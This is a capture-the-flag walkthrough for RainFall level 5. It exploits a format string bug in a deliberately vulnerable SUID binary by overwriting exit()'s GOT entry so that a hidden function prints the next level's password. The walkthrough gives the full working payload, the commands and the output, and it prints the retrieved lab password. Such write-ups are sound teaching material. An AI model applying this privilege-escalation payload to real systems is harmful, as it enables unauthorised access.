# Level 5 Walkthrough

## Who am I?

```bash
level5@RainFall:~$ id
uid=2026(level5) gid=2026(level5) groups=2026(level5),100(users)
```

## Where am I?

```bash
level5@RainFall:~$ ls -l
-rwsr-s---+ 1 level6 users 5252 Mar  6  2016 level5*
```

We are in possession of a SUID binary owned by `level6`. Our objective is to exploit this binary to execute a command as `level6` and retrieve the contents of the `.pass` file.

---

## Program Behavior

Running the binary:

```bash
level5@RainFall:~$ ./level5
hello
hello
```

No crash, even when injecting long strings:

```bash
level5@RainFall:~$ python -c "print('A'*200)" | ./level5
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

This suggests the program uses `fgets()`, which safely limits input size.

---

## Decompiled Structure (via Ghidra)

```c
void main(void)
{
  n();
  return;
}

void n(void)
{
  char local_20c [520];

  fgets(local_20c, 0x200, stdin);
  printf(local_20c);

  exit(1);
}

void o(void)
{
  system("/bin/cat /home/user/level6/.pass");
  _exit(1);
}
```

---

## Format String Vulnerability

`printf()` is called with user input, without format string control:

```c
printf(local_20c); // vulnerable
```

This introduces a classic format string vulnerability. We can try to leak stack values:

```bash
python -c 'print "AAAA %x %x %x %x %x %x %x %x %x %x"' | ./level5
```

We continue until we spot `0x41414141`:

```bash
python -c 'print "AAAA" + " %x" * 15' | ./level5
```

We find `41414141` (AAAA) at the **4th** position on the stack. So we will use `%4$n`.

---

## Exploitation Strategy

We know:

* `exit()` is called at the end of `n()`
* `exit()` has an entry in the GOT at `0x08049838`, which stands for Global Offset Table. The GOT is a section in memory used by dynamically linked executables to hold the addresses of external functions. When a function like `exit()` is first called, the binary looks up its actual address via the GOT. Since the GOT is writable, it becomes a valuable target for attackers who want to hijack control flow by replacing the function's address with another, in this case, pointing `exit()` to the hidden `o()` function.
* There's a hidden function `o()` at `0x080484a4` which prints the flag

We want to overwrite the GOT entry of `exit` to point to `o`, so that when `exit()` is called, it executes `o()` instead.

We verify addresses:

```bash
objdump -R level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
```

```gdb
(gdb) info functions o
0x080484a4  o
```

Now we build a payload to overwrite the GOT entry of `exit()` (at `0x08049838`) with the value `0x080484a4` using the format string exploit.

We test a simple probe:

```bash
python -c 'print "\x38\x98\x04\x08" + " %x" * 10' > /tmp/exploit
cat /tmp/exploit | ./level5
8 200 b7fd1ac0 b7ff37d0 8049838 20782520 25207825 78252078 20782520 25207825 78252078
```

We observe that the address lands at the 4th argument → use `%4$n`.

### Final Payload

We need to print `134513828` characters (decimal value of `0x080484a4`) before `%n` is triggered.

```bash
python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit
cat /tmp/exploit - | ./level5
```

This replaces the GOT entry of `exit()` with `o()`, which is executed as soon as `exit()` is called:

```bash
                                               512
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

---

## Conclusion

This level demonstrates how a format string vulnerability can be used to overwrite function pointers inside the GOT. Specifically, we:

* Identified that `printf()` is called with user input and no format string
* Found a hidden function `o()` that reveals the flag
* Determined the GOT address of `exit()` → `0x08049838`
* Overwrote that address with `0x080484a4` (address of `o()`)
* Used `%n` at offset 4 on the stack to perform the write
* Upon program exit, our payload triggered execution of `o()` and revealed the flag

Dynamic analysis with GDB and memory inspection was essential to confirm addresses and offsets precisely, allowing a reliable exploitation strategy.

---

## Files in this repository

* `flag.txt`: file containing the retrieved flag
* `asm_analysis.md`: GDB analysis of the binary
* `source/`: contains `ghidra/` (raw Ghidra decompilation) and `clean/` (cleaned C, faithful to binary)
